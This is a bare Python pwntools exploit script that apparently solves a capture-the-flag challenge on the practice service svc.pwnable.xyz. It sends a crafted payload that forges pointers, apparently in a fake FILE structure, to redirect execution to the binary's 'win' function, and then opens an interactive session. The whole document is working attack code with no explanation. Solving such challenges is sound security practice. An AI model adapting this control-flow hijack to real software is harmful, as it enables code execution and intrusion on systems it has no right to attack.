#!/usr/bin/python 
from pwn import *

#context.log_level = 'debug'
#p = process("./challenge")
p = remote("svc.pwnable.xyz", 30018)
#gdb.attach(p)
elf = ELF("./challenge")
win = elf.symbols['win']
lock_offset = 136
fclose_offset = 136
input = 0x601260

pay = '\x00'*lock_offset
pay += p64(0x601648)
pay += '\x00'*0x48
pay += p64(input+lock_offset+0x48+0x10)
#pay += '\x00'*fclose_offset
pay += '\x00'*0x10
pay += p64(win)

p.sendline(pay)

p.interactive()
